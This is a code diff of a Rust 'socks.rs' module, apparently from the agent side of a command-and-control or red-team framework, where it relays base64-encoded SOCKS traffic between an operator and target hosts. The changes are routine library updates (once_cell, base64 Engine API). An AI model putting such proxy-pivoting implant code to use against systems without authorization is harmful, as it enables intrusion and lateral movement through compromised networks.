@@ -1,7 +1,7 @@
 // socks.rs
-use crate::agent::AgentTask;
-use base64::{decode, encode};
-use lazy_static::lazy_static;
+use crate::AgentTask;
+use base64::{Engine as _, engine::general_purpose};
+use once_cell::sync::Lazy;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::error::Error;
@@ -11,19 +11,17 @@ use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
 use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
 
-// =========================
-// Global SOCKS Queue
-// =========================
-lazy_static! {
-    pub static ref SOCKS_QUEUE: Arc<Mutex<Vec<SocksMsg>>> = Arc::new(Mutex::new(Vec::new()));
-}
-
 #[derive(Deserialize, Serialize, Debug, Clone)]
 pub struct SocksMsg {
     pub exit: bool,
     pub server_id: u32,
     pub data: String,
 }
+
+// =========================
+// Global SOCKS Queue
+// =========================
+pub static SOCKS_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
 
 #[derive(Debug)]
 pub struct SocksState {
@@ -85,13 +83,13 @@ fn process_socks_messages(
 
     for msg in msgs {
         if msg.exit {
-            if let Some(mut stream) = conns.remove(&msg.server_id) {
+            if let Some(stream) = conns.remove(&msg.server_id) {
                 let _ = stream.shutdown(std::net::Shutdown::Both);
             }
             continue;
         }
 
-        let data = decode(&msg.data).unwrap_or_default();
+        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
         if data.is_empty() {
             continue;
         }
@@ -123,7 +121,7 @@ fn process_socks_messages(
                             responses.push(SocksMsg {
                                 exit: false,
                                 server_id: msg.server_id,
-                                data: encode(&buf[..n]),
+                                data: general_purpose::STANDARD.encode(&buf[..n]),
                             });
                             // Try to read again until timeout/WouldBlock
                             continue;
@@ -144,7 +142,7 @@ fn process_socks_messages(
                         responses.push(SocksMsg {
                             exit: false,
                             server_id: msg.server_id,
-                            data: encode(&response_data),
+                            data: general_purpose::STANDARD.encode(&response_data),
                         });
 
                         conns.insert(msg.server_id, stream.try_clone()?);
@@ -166,7 +164,7 @@ fn process_socks_messages(
                                     responses.push(SocksMsg {
                                         exit: false,
                                         server_id: msg.server_id,
-                                        data: encode(&buf[..n]),
+                                        data: general_purpose::STANDARD.encode(&buf[..n]),
                                     });
                                     continue;
                                 }
@@ -184,7 +182,7 @@ fn process_socks_messages(
                         responses.push(SocksMsg {
                             exit: false,
                             server_id: msg.server_id,
-                            data: encode(&err_resp),
+                            data: general_purpose::STANDARD.encode(&err_resp),
                         });
                     }
                 }
@@ -193,7 +191,7 @@ fn process_socks_messages(
                 responses.push(SocksMsg {
                     exit: false,
                     server_id: msg.server_id,
-                    data: encode(&err_resp),
+                    data: general_purpose::STANDARD.encode(&err_resp),
                 });
             }
         }
